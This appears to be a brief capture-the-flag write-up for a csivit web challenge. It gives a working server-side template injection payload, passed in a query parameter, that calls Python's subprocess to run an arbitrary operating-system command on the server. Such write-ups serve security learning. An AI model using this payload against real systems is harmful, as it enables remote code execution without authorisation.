**Challenge:** http://chall.csivit.com:30279

SSTI leading to RCE: `http://chall.csivit.com:30279/?icecream={{__import__("subprocess").getoutput("<OS COMMAND HERE>")}}`
